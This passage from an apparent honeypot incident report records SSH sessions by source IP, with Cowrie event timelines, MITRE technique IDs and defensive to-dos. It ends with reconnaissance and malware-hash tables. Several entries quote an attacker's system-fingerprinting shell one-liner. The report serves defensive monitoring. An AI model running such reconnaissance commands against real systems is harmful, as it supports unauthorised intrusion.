| `2026-07-11 08:47:12` | `cowrie.log.closed` |
| `2026-07-11 08:47:12` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]233` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]233` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c39c25c1efa0

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]233` |
| **First Seen** | 2026-07-11 08:48 |
| **Last Seen** | 2026-07-11 08:48 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-11 08:48:52` | `cowrie.session.connect` |
| `2026-07-11 08:48:52` | `cowrie.client.version` |
| `2026-07-11 08:48:52` | `cowrie.client.kex` |
| `2026-07-11 08:48:53` | `cowrie.login.success` |
| `2026-07-11 08:48:54` | `cowrie.session.params` |
| `2026-07-11 08:48:54` | `cowrie.command.input` |
| `2026-07-11 08:48:54` | `cowrie.command.input` |
| `2026-07-11 08:48:54` | `cowrie.command.input` |
| `2026-07-11 08:48:54` | `cowrie.command.input` |
| `2026-07-11 08:48:54` | `cowrie.command.input` |
| `2026-07-11 08:48:54` | `cowrie.command.success` |
| `2026-07-11 08:48:54` | `cowrie.command.input` |
| `2026-07-11 08:48:54` | `cowrie.command.input` |
| `2026-07-11 08:48:54` | `cowrie.command.input` |
| `2026-07-11 08:48:54` | `cowrie.command.input` |
| `2026-07-11 08:48:54` | `cowrie.log.closed` |
| `2026-07-11 08:48:54` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]233` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]233` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-707e1c157fa9

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]233` |
| **First Seen** | 2026-07-11 08:50 |
| **Last Seen** | 2026-07-11 08:50 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-11 08:50:32` | `cowrie.session.connect` |
| `2026-07-11 08:50:33` | `cowrie.client.version` |
| `2026-07-11 08:50:33` | `cowrie.client.kex` |
| `2026-07-11 08:50:34` | `cowrie.login.success` |
| `2026-07-11 08:50:35` | `cowrie.session.params` |
| `2026-07-11 08:50:35` | `cowrie.command.input` |
| `2026-07-11 08:50:35` | `cowrie.command.input` |
| `2026-07-11 08:50:35` | `cowrie.command.input` |
| `2026-07-11 08:50:35` | `cowrie.command.input` |
| `2026-07-11 08:50:35` | `cowrie.command.input` |
| `2026-07-11 08:50:35` | `cowrie.command.success` |
| `2026-07-11 08:50:35` | `cowrie.command.input` |
| `2026-07-11 08:50:35` | `cowrie.command.input` |
| `2026-07-11 08:50:35` | `cowrie.command.input` |
| `2026-07-11 08:50:35` | `cowrie.command.input` |
| `2026-07-11 08:50:36` | `cowrie.log.closed` |
| `2026-07-11 08:50:36` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]233` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]233` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-56d75581dd0c

| Field | Detail |
|---|---|
| **Source IP** | `47.77.216[.]159` |
| **First Seen** | 2026-07-11 08:51 |
| **Last Seen** | 2026-07-11 08:51 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-11 08:51:03` | `cowrie.session.connect` |
| `2026-07-11 08:51:03` | `cowrie.client.version` |
| `2026-07-11 08:51:03` | `cowrie.client.kex` |
| `2026-07-11 08:51:04` | `cowrie.login.success` |
| `2026-07-11 08:51:04` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `47.77.216[.]159` to AbuseIPDB if not already reported
- [ ] Block `47.77.216[.]159` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b8b67dac049b

| Field | Detail |
|---|---|
| **Source IP** | `130.12.180[.]51` |
| **First Seen** | 2026-07-11 08:51 |
| **Last Seen** | 2026-07-11 08:51 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-11 08:51:04` | `cowrie.session.connect` |
| `2026-07-11 08:51:04` | `cowrie.client.version` |
| `2026-07-11 08:51:04` | `cowrie.client.kex` |
| `2026-07-11 08:51:04` | `cowrie.login.success` |
| `2026-07-11 08:51:05` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `130.12.180[.]51` to AbuseIPDB if not already reported
- [ ] Block `130.12.180[.]51` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-547a2af77608

| Field | Detail |
|---|---|
| **Source IP** | `70.89.116[.]5` |
| **First Seen** | 2026-07-11 08:51 |
| **Last Seen** | 2026-07-11 08:51 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-11 08:51:51` | `cowrie.session.connect` |
| `2026-07-11 08:51:52` | `cowrie.client.version` |
| `2026-07-11 08:51:52` | `cowrie.client.kex` |
| `2026-07-11 08:51:53` | `cowrie.login.success` |
| `2026-07-11 08:51:53` | `cowrie.direct-tcpip.request` |
| `2026-07-11 08:51:58` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `70.89.116[.]5` to AbuseIPDB if not already reported
- [ ] Block `70.89.116[.]5` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0264c3c60f0a

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]233` |
| **First Seen** | 2026-07-11 08:52 |
| **Last Seen** | 2026-07-11 08:52 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-11 08:52:14` | `cowrie.session.connect` |
| `2026-07-11 08:52:14` | `cowrie.client.version` |
| `2026-07-11 08:52:14` | `cowrie.client.kex` |
| `2026-07-11 08:52:15` | `cowrie.login.success` |
| `2026-07-11 08:52:16` | `cowrie.session.params` |
| `2026-07-11 08:52:16` | `cowrie.command.input` |
| `2026-07-11 08:52:16` | `cowrie.command.input` |
| `2026-07-11 08:52:16` | `cowrie.command.input` |
| `2026-07-11 08:52:16` | `cowrie.command.input` |
| `2026-07-11 08:52:16` | `cowrie.command.input` |
| `2026-07-11 08:52:16` | `cowrie.command.success` |
| `2026-07-11 08:52:16` | `cowrie.command.input` |
| `2026-07-11 08:52:16` | `cowrie.command.input` |
| `2026-07-11 08:52:16` | `cowrie.command.input` |
| `2026-07-11 08:52:16` | `cowrie.command.input` |
| `2026-07-11 08:52:17` | `cowrie.log.closed` |
| `2026-07-11 08:52:17` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]233` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]233` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-04ef30f852f2

| Field | Detail |
|---|---|
| **Source IP** | `185.242.3[.]195` |
| **First Seen** | 2026-07-11 08:52 |
| **Last Seen** | 2026-07-11 08:52 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-11 08:52:26` | `cowrie.session.connect` |
| `2026-07-11 08:52:26` | `cowrie.client.version` |
| `2026-07-11 08:52:26` | `cowrie.client.kex` |
| `2026-07-11 08:52:27` | `cowrie.login.success` |
| `2026-07-11 08:52:28` | `cowrie.session.params` |
| `2026-07-11 08:52:28` | `cowrie.command.input` |
| `2026-07-11 08:52:28` | `cowrie.log.closed` |
| `2026-07-11 08:52:28` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `185.242.3[.]195` to AbuseIPDB if not already reported
- [ ] Block `185.242.3[.]195` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ff3c5d1b4a06

| Field | Detail |
|---|---|
| **Source IP** | `187.8.120[.]90` |
| **First Seen** | 2026-07-11 08:53 |
| **Last Seen** | 2026-07-11 08:53 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-11 08:53:34` | `cowrie.session.connect` |
| `2026-07-11 08:53:35` | `cowrie.client.version` |
| `2026-07-11 08:53:35` | `cowrie.client.kex` |
| `2026-07-11 08:53:38` | `cowrie.login.success` |
| `2026-07-11 08:53:39` | `cowrie.direct-tcpip.request` |
| `2026-07-11 08:53:43` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `187.8.120[.]90` to AbuseIPDB if not already reported
- [ ] Block `187.8.120[.]90` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-42c11b4c3e7c

| Field | Detail |
|---|---|
| **Source IP** | `178.178.222[.]59` |
| **First Seen** | 2026-07-11 08:53 |
| **Last Seen** | 2026-07-11 08:53 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-11 08:53:44` | `cowrie.session.connect` |
| `2026-07-11 08:53:45` | `cowrie.client.version` |
| `2026-07-11 08:53:45` | `cowrie.client.kex` |
| `2026-07-11 08:53:46` | `cowrie.login.success` |
| `2026-07-11 08:53:47` | `cowrie.direct-tcpip.request` |
| `2026-07-11 08:53:51` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `178.178.222[.]59` to AbuseIPDB if not already reported
- [ ] Block `178.178.222[.]59` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4ff0cc205fa9

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]233` |
| **First Seen** | 2026-07-11 08:53 |
| **Last Seen** | 2026-07-11 08:53 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-11 08:53:54` | `cowrie.session.connect` |
| `2026-07-11 08:53:54` | `cowrie.client.version` |
| `2026-07-11 08:53:54` | `cowrie.client.kex` |
| `2026-07-11 08:53:55` | `cowrie.login.success` |
| `2026-07-11 08:53:56` | `cowrie.session.params` |
| `2026-07-11 08:53:56` | `cowrie.command.input` |
| `2026-07-11 08:53:56` | `cowrie.command.input` |
| `2026-07-11 08:53:56` | `cowrie.command.input` |
| `2026-07-11 08:53:56` | `cowrie.command.input` |
| `2026-07-11 08:53:56` | `cowrie.command.input` |
| `2026-07-11 08:53:56` | `cowrie.command.success` |
| `2026-07-11 08:53:56` | `cowrie.command.input` |
| `2026-07-11 08:53:56` | `cowrie.command.input` |
| `2026-07-11 08:53:56` | `cowrie.command.input` |
| `2026-07-11 08:53:56` | `cowrie.command.input` |
| `2026-07-11 08:53:57` | `cowrie.log.closed` |
| `2026-07-11 08:53:57` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]233` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]233` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

---

## 📡 Reconnaissance Activity — Grouped by Source IP

> Repeated connect/close sessions with no auth success, commands, or downloads.
> Grouped within a 120-minute window per IP to reduce noise.

| IP | Sessions | First Seen | Last Seen | Duration | Login Attempts | TTPs | Severity |
|---|---|---|---|---|---|---|---|
| `107.150.146[.]69` | **150** | 2026-07-11 04:55 | 2026-07-11 08:43 | 89m | 0 | `T1592` | 🟠 MEDIUM |
| `179.61.192[.]156` | **81** | 2026-07-11 04:55 | 2026-07-11 08:54 | 94m | 0 | `T1592` | 🟠 MEDIUM |
| `104.143.10[.]174` | **62** | 2026-07-11 04:57 | 2026-07-11 08:54 | 25m | 0 | `T1592` | 🟠 MEDIUM |
| `207.175.50[.]16` | **30** | 2026-07-11 06:18 | 2026-07-11 06:19 | 3m | 0 | `T1592` | 🟠 MEDIUM |
| `34.77.62[.]182` | **30** | 2026-07-11 07:05 | 2026-07-11 07:05 | 2m | 0 | `T1592` | 🟠 MEDIUM |
| `35.195.204[.]234` | **30** | 2026-07-11 08:00 | 2026-07-11 08:00 | 4m | 0 | `T1592` | 🟠 MEDIUM |
| `139.199.80[.]137` | **9** | 2026-07-11 05:13 | 2026-07-11 08:41 | 0m | 0 | `T1592` | 🟢 LOW |
| `160.119.71[.]136` | **7** | 2026-07-11 06:48 | 2026-07-11 06:48 | 0m | 0 | `T1592` | 🟢 LOW |
| `34.38.113[.]174` | **3** | 2026-07-11 06:56 | 2026-07-11 06:56 | 0m | 0 | `T1592` | 🟢 LOW |
| `91.92.40[.]233` | **3** | 2026-07-11 05:38 | 2026-07-11 05:48 | 0m | 2 | `T1110.001 · T1592` | 🟢 LOW |
| `195.178.110[.]137` | **2** | 2026-07-11 07:00 | 2026-07-11 07:04 | 0m | 0 | `T1592` | 🟢 LOW |
| `47.108.68[.]187` | **2** | 2026-07-11 06:50 | 2026-07-11 06:51 | 0m | 0 | `T1592` | 🟢 LOW |
| `52.142.44[.]95` | **2** | 2026-07-11 06:07 | 2026-07-11 07:59 | 2m | 0 | `T1592` | 🟢 LOW |
| `101.96.195[.]62` | 1 | 2026-07-11 07:44 | 2026-07-11 07:46 | 120s | 0 | `T1592` | 🟢 LOW |
| `103.203.57[.]19` | 1 | 2026-07-11 06:50 | 2026-07-11 06:50 | 5s | 0 | `T1592` | 🟢 LOW |
| `103.203.57[.]2` | 1 | 2026-07-11 05:56 | 2026-07-11 05:56 | 10s | 0 | `T1592` | 🟢 LOW |
| `104.12.19[.]114` | 1 | 2026-07-11 07:32 | 2026-07-11 07:32 | 2s | 0 | `T1592` | 🟢 LOW |
| `106.246.89[.]69` | 1 | 2026-07-11 06:34 | 2026-07-11 06:34 | 6s | 0 | `T1592` | 🟢 LOW |
| `111.17.213[.]162` | 1 | 2026-07-11 05:31 | 2026-07-11 05:33 | 120s | 0 | `T1592` | 🟢 LOW |
| `147.45.60[.]18` | 1 | 2026-07-11 07:41 | 2026-07-11 07:41 | 0s | 0 | `T1592` | 🟢 LOW |
| `154.16.44[.]117` | 1 | 2026-07-11 05:18 | 2026-07-11 05:18 | 0s | 0 | `T1592` | 🟢 LOW |
| `156.238.86[.]2` | 1 | 2026-07-11 05:01 | 2026-07-11 05:01 | 1s | 0 | `T1592` | 🟢 LOW |
| `159.65.233[.]253` | 1 | 2026-07-11 07:25 | 2026-07-11 07:26 | 57s | 0 | `T1592` | 🟢 LOW |
| `172.239.71[.]239` | 1 | 2026-07-11 04:59 | 2026-07-11 04:59 | 0s | 0 | `T1592` | 🟢 LOW |
| `183.171.155[.]166` | 1 | 2026-07-11 05:54 | 2026-07-11 05:56 | 120s | 0 | `T1592` | 🟢 LOW |
| `183.171.236[.]87` | 1 | 2026-07-11 08:32 | 2026-07-11 08:34 | 120s | 0 | `T1592` | 🟢 LOW |
| `183.171.5[.]112` | 1 | 2026-07-11 07:13 | 2026-07-11 07:15 | 120s | 0 | `T1592` | 🟢 LOW |
| `184.105.247[.]254` | 1 | 2026-07-11 07:55 | 2026-07-11 07:55 | 0s | 0 | `T1592` | 🟢 LOW |
| `195.96.139[.]203` | 1 | 2026-07-11 05:52 | 2026-07-11 05:52 | 2s | 0 | `T1592` | 🟢 LOW |
| `203.176.95[.]143` | 1 | 2026-07-11 05:23 | 2026-07-11 05:25 | 120s | 0 | `T1592` | 🟢 LOW |
| `222.99.52[.]202` | 1 | 2026-07-11 05:17 | 2026-07-11 05:17 | 0s | 0 | `T1592` | 🟢 LOW |
| `34.65.62[.]43` | 1 | 2026-07-11 08:30 | 2026-07-11 08:30 | 30s | 0 | `T1592` | 🟢 LOW |
| `35.241.208[.]90` | 1 | 2026-07-11 06:55 | 2026-07-11 06:56 | 7s | 0 | `T1592` | 🟢 LOW |
| `45.194.67[.]27` | 1 | 2026-07-11 08:32 | 2026-07-11 08:32 | 0s | 0 | `T1592` | 🟢 LOW |
| `45.56.79[.]53` | 1 | 2026-07-11 05:34 | 2026-07-11 05:34 | 0s | 0 | `T1592` | 🟢 LOW |
| `45.79.115[.]134` | 1 | 2026-07-11 06:35 | 2026-07-11 06:35 | 1s | 0 | `T1592` | 🟢 LOW |
| `45.79.207[.]110` | 1 | 2026-07-11 05:34 | 2026-07-11 05:34 | 2s | 0 | `T1592` | 🟢 LOW |
| `49.124.152[.]208` | 1 | 2026-07-11 07:50 | 2026-07-11 07:50 | 0s | 0 | `T1592` | 🟢 LOW |
| `49.124.152[.]234` | 1 | 2026-07-11 06:41 | 2026-07-11 06:41 | 0s | 0 | `T1592` | 🟢 LOW |
| `64.62.197[.]77` | 1 | 2026-07-11 06:25 | 2026-07-11 06:25 | 2s | 0 | `T1592` | 🟢 LOW |
| `64.89.161[.]91` | 1 | 2026-07-11 05:59 | 2026-07-11 05:59 | 0s | 0 | `T1592` | 🟢 LOW |
| `65.49.20[.]66` | 1 | 2026-07-11 07:52 | 2026-07-11 07:52 | 0s | 0 | `T1592` | 🟢 LOW |
| `66.132.186[.]162` | 1 | 2026-07-11 06:49 | 2026-07-11 06:49 | 16s | 0 | `T1592` | 🟢 LOW |
| `80.233.77[.]136` | 1 | 2026-07-11 07:11 | 2026-07-11 07:11 | 0s | 0 | `T1592` | 🟢 LOW |
| `83.191.176[.]93` | 1 | 2026-07-11 06:08 | 2026-07-11 06:10 | 120s | 0 | `T1592` | 🟢 LOW |
| `83.191.181[.]23` | 1 | 2026-07-11 07:10 | 2026-07-11 07:12 | 120s | 0 | `T1592` | 🟢 LOW |
| `85.217.149[.]20` | 1 | 2026-07-11 07:18 | 2026-07-11 07:18 | 0s | 0 | `T1592` | 🟢 LOW |
| `89.21.67[.]157` | 1 | 2026-07-11 05:18 | 2026-07-11 05:18 | 10s | 0 | `T1592` | 🟢 LOW |
| `91.247.175[.]159` | 1 | 2026-07-11 06:47 | 2026-07-11 06:47 | 13s | 0 | `T1592` | 🟢 LOW |

---

## 🦠 Malware Analysis Results (49 sample(s))

| File | Type | SHA-256 (short) | Threat Score | Severity | VT Detections |
|---|---|---|---|---|---|
| `00b374d5249b32ab298f86c2137962e6bf1f71e03c4db8e3ae169b601480d730` | Python Script | `00b374d5249b32ab...` | 66/100 | 🟡 MEDIUM | **16/73** 🔴 |
| `0136e2f3dda2e48ca15b2bab1027095ca15fb573294e3904a53e6913dfc62ab6` | ELF Binary (Linux executable) (MIPS 32-bit) | `0136e2f3dda2e48c...` | 57/100 | 🟡 MEDIUM | **18/74** 🔴 |
| `01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b` | Unknown binary | `01ba4719c80b6fe9...` | 0/100 | 🟢 LOW | 0/74 ✅ |
| `048e374baac36d8cf68dd32e48313ef8eb517d647548b1bf5f26d2d0e2e3cdc7` | ELF Binary (Linux executable) (x86 32-bit) | `048e374baac36d8c...` | 45/100 | 🟡 MEDIUM | **38/74** 🔴 |
| `155f0ec763ff3db0f48796e55d1401620dd739d66ab88a8dd78d8fae18cfc79f` | Shell Script | `155f0ec763ff3db0...` | 56/100 | 🟡 MEDIUM | **17/74** 🔴 |
| `16d3440fcc067823afc44dcbccea9fbbc2f8c68ae53b7aea45f9adff4c127086` | Bash Script | `16d3440fcc067823...` | 65/100 | 🟡 MEDIUM | **14/72** 🔴 |
| `197c74408e15bd1168105f564f96aace4fd4819961b724630bf5a6be4878daf8` | Bash Script | `197c74408e15bd11...` | 68/100 | 🟡 MEDIUM | **22/74** 🔴 |
| `1ef0eb60318495dd0cb100fc828f28237d487b800605c7cc54155cf34582598b` | ELF Binary (Linux executable) (x86-64 64-bit) | `1ef0eb60318495dd...` | 38/100 | 🟢 LOW | **22/74** 🔴 |
| `20260630-221457-3e8812e60d6c-0-redir__home_20230724T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260630-221457-3e8812e60d6c-0-redir__home_20600609T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260630-221457-3e8812e60d6c-0-redir__home_MSMQ_poc` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260630-221457-3e8812e60d6c-0-redir__home_uuid_1_00000000_0000_0000_0000_000000000000` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `21e99667e2f0e73d12aae89f8cabd338426ab1fe4ce828ec93c07de615ef754c` | ELF Binary (Linux executable) (AArch64 64-bit) | `21e99667e2f0e73d...` | 63/100 | 🟡 MEDIUM | **33/74** 🔴 |
| `27d205dc183ea2fad0e55e10b206404be20908e39a74569ff99182d7326ed9c0` | ELF Binary (Linux executable) (x86-64 64-bit) | `27d205dc183ea2fa...` | 44/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `289fd4a7a10aaf8aa313ab80cc170018fc662d0a7d034a3b92b9d3d3945b0736` | ELF Binary (Linux executable) (x86-64 64-bit) | `289fd4a7a10aaf8a...` | 44/100 | 🟡 MEDIUM | **36/74** 🔴 |
| `2a39d592018600e4b3db2caed6cdaa8c651d3dacbebf8ac1f0960e493843c435` | ELF Binary (Linux executable) (x86-64 64-bit) | `2a39d592018600e4...` | 45/100 | 🟡 MEDIUM | **39/75** 🔴 |
| `2bd2ab1d4b75aa2b4eed1af697188b8bce35a882faf4335cb4fafc2847197995` | ELF Binary (Linux executable) (unknown (e_machine=0x04) 32-bit) | `2bd2ab1d4b75aa2b...` | 53/100 | 🟡 MEDIUM | **33/74** 🔴 |
| `3552f719a379865960a169e2dacea968f4e8f46bd31907f2f89df431d09d9d9e` | ELF Binary (Linux executable) (x86-64 64-bit) | `3552f719a3798659...` | 46/100 | 🟡 MEDIUM | **40/74** 🔴 |
| `3625cfdcd6d434bfa672753ef4b197df8a01388d220bafc9edfa2d0d29c7fcef` | ELF Binary (Linux executable) (x86-64 64-bit) | `3625cfdcd6d434bf...` | 46/100 | 🟡 MEDIUM | **40/75** 🔴 |
| `3625d068896953595e75df328676a08bc071977ac1ff95d44b745bbcb7018c6f` | ELF Binary (Linux executable) (ARM 32-bit) | `3625d06889695359...` | 44/100 | 🟡 MEDIUM | **35/74** 🔴 |
| `3910f46fe809d723d169b5723e0724dba7aed441a065b53b98e2f1b0a9736569` | ELF Binary (Linux executable) (MIPS 32-bit) | `3910f46fe809d723...` | 65/100 | 🟡 MEDIUM | **37/74** 🔴 |
| `3ad48bae18b7ea8e7ffe3608b6eeaa4673b6ff47e9e6a21def774eecba66364a` | ELF Binary (Linux executable) (x86 32-bit) | `3ad48bae18b7ea8e...` | 86/100 | 🔴 HIGH | **41/74** 🔴 |
| `40db9279ba409757c074048529be5bf8f141fa022489a965792e7f7de2223b78` | ELF Binary (Linux executable) (ARM 32-bit) | `40db9279ba409757...` | 62/100 | 🟡 MEDIUM | **31/73** 🔴 |
| `44689d3e1a7f460db2ecc14351c171f4910721257f83024c63cbc07f4e2b977c` | ELF Binary (Linux executable) (x86-64 64-bit) | `44689d3e1a7f460d...` | 35/100 | 🟢 LOW | **13/74** 🔴 |
| `4481c88954298a5e5e0f0d70cd011644e8442e1aeb0ce42cc3c8b4d51a637f02` | ELF Binary (Linux executable) (ARM 32-bit) | `4481c88954298a5e...` | 51/100 | 🟡 MEDIUM | **29/73** 🔴 |
| `47b268c21591069bfe4099833ad66b8138a53ab2dcb866e040d466aee1f8624c` | ELF Binary (Linux executable) (x86-64 64-bit) | `47b268c21591069b...` | 39/100 | 🟢 LOW | **23/74** 🔴 |
| `494ab0439cd9a373aca71bf5107e0718a9e14b9b805632835c99c42b88a50984` | ELF Binary (Linux executable) (x86 32-bit) | `494ab0439cd9a373...` | 51/100 | 🟡 MEDIUM | **28/73** 🔴 |
| `526c830542c17e6883da850de8dc2c3c2ffc35b446f33c61892b193e50f8d8ed` | ELF Binary (Linux executable) (x86-64 64-bit) | `526c830542c17e68...` | 53/100 | 🟡 MEDIUM | **33/73** 🔴 |
